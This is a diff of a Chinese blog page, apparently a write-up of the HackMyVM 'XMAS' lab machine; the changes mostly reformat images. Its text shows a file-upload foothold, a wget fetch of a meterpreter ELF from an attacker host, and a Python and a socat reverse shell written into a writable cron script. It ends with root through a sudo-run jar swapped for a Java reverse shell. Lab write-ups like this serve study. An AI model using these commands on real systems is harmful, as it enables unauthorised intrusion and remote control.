@@ -11,14 +11,14 @@
 <meta name="referrer" content="no-referrer">
 <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="description" content="靶机, 启动 192.168.10.16 端口扫描 web 服务 目录扫描
-在主页的下面发现了一个上传点, 直接上传反弹 shell
-使用 nc 失败, 换成了 webshell
-然后还是用了 meterpreter
+<meta name="description" content="靶机, 启动 192.168.10.16 端口扫描 HMM_XMAS_image_1 HMM_XMAS_image_2 web 服务 目录扫描
+HMM_XMAS_image_3 在主页的下面发现了一个上传点, 直接上传反弹 shell
+HMM_XMAS_image_4 使用 nc 失败, 换成了 webshell
+HMM_XMAS_image_5 HMM_XMAS_image_6 然后还是用了 meterpreter
 wget http://192.168.10.11:8000/shell.elf -O /tmp/shell.elf&amp;&amp;chmod 777 /tmp/shell.elf www-data ,进一步收集信息 /home/alabaster/nice_list. txt
-这有个 python 代码,. 在 linpeas. sh 枚举之后发现是定时任务, 并且是可写的
-echo &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.10.11&#34;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;bash&#34;)&#39; &gt; nice_or_naughty.py echo &#39;import subprocess; subprocess.call([&#34;/tmp/newshell.elf&#34;])&#39; &gt; nice_or_naughty.py 又是这样子不稳定的 shell
-上传一个 socat 二进制文件上去算了
+HMM_XMAS_image_7 这有个 python 代码,. 在 linpeas. sh 枚举之后发现是定时任务, 并且是可写的
+HMM_XMAS_image_8 echo &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.10.11&#34;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;bash&#34;)&#39; &gt; nice_or_naughty.py echo &#39;import subprocess; subprocess.call([&#34;/tmp/newshell.elf&#34;])&#39; &gt; nice_or_naughty.py 又是这样子不稳定的 shell
+HMM_XMAS_image_9 上传一个 socat 二进制文件上去算了
 "/>
 <meta name="keywords" content=""/>
 
@@ -39,14 +39,14 @@ echo &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK
 <meta property="og:url" content="https://l1uyun.one/posts/hmm_xmas/">
   <meta property="og:site_name" content="l1uyun">
   <meta property="og:title" content="XMAS">
-  <meta property="og:description" content="靶机, 启动 192.168.10.16 端口扫描 web 服务 目录扫描
-在主页的下面发现了一个上传点, 直接上传反弹 shell
-使用 nc 失败, 换成了 webshell
-然后还是用了 meterpreter
+  <meta property="og:description" content="靶机, 启动 192.168.10.16 端口扫描 HMM_XMAS_image_1 HMM_XMAS_image_2 web 服务 目录扫描
+HMM_XMAS_image_3 在主页的下面发现了一个上传点, 直接上传反弹 shell
+HMM_XMAS_image_4 使用 nc 失败, 换成了 webshell
+HMM_XMAS_image_5 HMM_XMAS_image_6 然后还是用了 meterpreter
 wget http://192.168.10.11:8000/shell.elf -O /tmp/shell.elf&amp;&amp;chmod 777 /tmp/shell.elf www-data ,进一步收集信息 /home/alabaster/nice_list. txt
-这有个 python 代码,. 在 linpeas. sh 枚举之后发现是定时任务, 并且是可写的
-echo &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.10.11&#34;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;bash&#34;)&#39; &gt; nice_or_naughty.py echo &#39;import subprocess; subprocess.call([&#34;/tmp/newshell.elf&#34;])&#39; &gt; nice_or_naughty.py 又是这样子不稳定的 shell
-上传一个 socat 二进制文件上去算了">
+HMM_XMAS_image_7 这有个 python 代码,. 在 linpeas. sh 枚举之后发现是定时任务, 并且是可写的
+HMM_XMAS_image_8 echo &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.10.11&#34;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;bash&#34;)&#39; &gt; nice_or_naughty.py echo &#39;import subprocess; subprocess.call([&#34;/tmp/newshell.elf&#34;])&#39; &gt; nice_or_naughty.py 又是这样子不稳定的 shell
+HMM_XMAS_image_9 上传一个 socat 二进制文件上去算了">
   <meta property="og:locale" content="zh_CN">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -253,39 +253,99 @@ function checkNightMode() {
       <h2 id="靶机-启动">靶机, 启动</h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.10.16
 </span></span></code></pre></div><h2 id="端口扫描">端口扫描</h2>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_1.png" alt="HMM_XMAS_image_1"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_2.png" alt="HMM_XMAS_image_2"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_1.png" alt="HMM_XMAS_image_1" /><figcaption>HMM_XMAS_image_1</figcaption></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_2.png" alt="HMM_XMAS_image_2" /><figcaption>HMM_XMAS_image_2</figcaption></figure>
+
+
+</p>
 <h2 id="web-服务">web 服务</h2>
 <p>目录扫描</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_3.png" alt="HMM_XMAS_image_3"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_3.png" alt="HMM_XMAS_image_3" /><figcaption>HMM_XMAS_image_3</figcaption></figure>
+
+
+</p>
 <p>在主页的下面发现了一个上传点, 直接上传反弹 shell</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_4.png" alt="HMM_XMAS_image_4"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_4.png" alt="HMM_XMAS_image_4" /><figcaption>HMM_XMAS_image_4</figcaption></figure>
+
+
+</p>
 <p>使用 nc 失败, 换成了 webshell</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_5.png" alt="HMM_XMAS_image_5"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_6.png" alt="HMM_XMAS_image_6"  />
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_5.png" alt="HMM_XMAS_image_5" /><figcaption>HMM_XMAS_image_5</figcaption></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_6.png" alt="HMM_XMAS_image_6" /><figcaption>HMM_XMAS_image_6</figcaption></figure>
+
+
+
 然后还是用了 meterpreter</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://192.168.10.11:8000/shell.elf -O /tmp/shell.elf<span style="color:#f92672">&amp;&amp;</span>chmod <span style="color:#ae81ff">777</span> /tmp/shell.elf
 </span></span></code></pre></div><h2 id="www-data-进一步收集信息">www-data ,进一步收集信息</h2>
 <p>/home/alabaster/nice_list. txt</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_7.png" alt="HMM_XMAS_image_7"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_7.png" alt="HMM_XMAS_image_7" /><figcaption>HMM_XMAS_image_7</figcaption></figure>
+
+
+</p>
 <p>这有个 python 代码,. 在 linpeas. sh 枚举之后发现是定时任务, 并且是可写的</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_8.png" alt="HMM_XMAS_image_8"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_8.png" alt="HMM_XMAS_image_8" /><figcaption>HMM_XMAS_image_8</figcaption></figure>
+
+
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.10.11&#34;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;bash&#34;)&#39;</span> &gt; nice_or_naughty.py
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;import subprocess; subprocess.call([&#34;/tmp/newshell.elf&#34;])&#39;</span> &gt; nice_or_naughty.py
 </span></span></code></pre></div><p>又是这样子不稳定的 shell</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_9.png" alt="HMM_XMAS_image_9"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_9.png" alt="HMM_XMAS_image_9" /><figcaption>HMM_XMAS_image_9</figcaption></figure>
+
+
+</p>
 <p>上传一个 socat 二进制文件上去算了</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;import subprocess; subprocess.call([&#34;/tmp/socat&#34;, &#34;TCP:192.168.10.11:4445&#34;, &#34;EXEC:/bin/bash,pty,stderr,setsid,sigint,sane&#34;])&#39;</span> &gt; nice_or_naughty.py
 </span></span></code></pre></div><p>还是不行</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_10.png" alt="HMM_XMAS_image_10"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_10.png" alt="HMM_XMAS_image_10" /><figcaption>HMM_XMAS_image_10</figcaption></figure>
+
+
+</p>
 <h2 id="user-alabaster">User-alabaster</h2>
 <p>巨魔大佬 nb</p>
 <p>又学到一个工具 pwncat
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_11.png" alt="HMM_XMAS_image_11"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_11.png" alt="HMM_XMAS_image_11" /><figcaption>HMM_XMAS_image_11</figcaption></figure>
+
+
+</p>
 <h2 id="提权_sudo-执行-jar">提权_sudo 执行 jar</h2>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_12.png" alt="HMM_XMAS_image_12"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_12.png" alt="HMM_XMAS_image_12" /><figcaption>HMM_XMAS_image_12</figcaption></figure>
+
+
+</p>
 <p>利用 sudo 涉及的文件可写, 用 gpt 生成了个 java 的反弹 shell</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">## 编译成java字节码</span>
 </span></span><span style="display:flex;"><span>javac ReverseShell.java
@@ -297,13 +357,28 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">## 使用jar命令和上面创建的清单文件将编译后的.class文件打包成一个JAR文件。命令格式如下：</span>
 </span></span><span style="display:flex;"><span>jar cfm ReverseShell.jar Manifest.txt ReverseShell.class
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_13.png" alt="HMM_XMAS_image_13"  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_13.png" alt="HMM_XMAS_image_13" /><figcaption>HMM_XMAS_image_13</figcaption></figure>
+
+
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /tmp 
 </span></span><span style="display:flex;"><span>wget http://192.168.10.11:8000/ReverseShell.jar
 </span></span><span style="display:flex;"><span>cp ReverseShell.jar /home/alabaster/PublishList/PublishList.jar
 </span></span><span style="display:flex;"><span>sudo -u root /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_14.png" alt="HMM_XMAS_image_14"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_15.png" alt="HMM_XMAS_image_15"  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_14.png" alt="HMM_XMAS_image_14" /><figcaption>HMM_XMAS_image_14</figcaption></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_15.png" alt="HMM_XMAS_image_15" /><figcaption>HMM_XMAS_image_15</figcaption></figure>
+
+
+</p>
 
       
     </div>
@@ -458,7 +533,7 @@ function checkNightMode() {
 <footer class="footer">
   <div class="footer__inner">
     <div class="copyright copyright-font">
-      <span>共 85391 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
+      <span>共 85604 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
     </div>
       
     
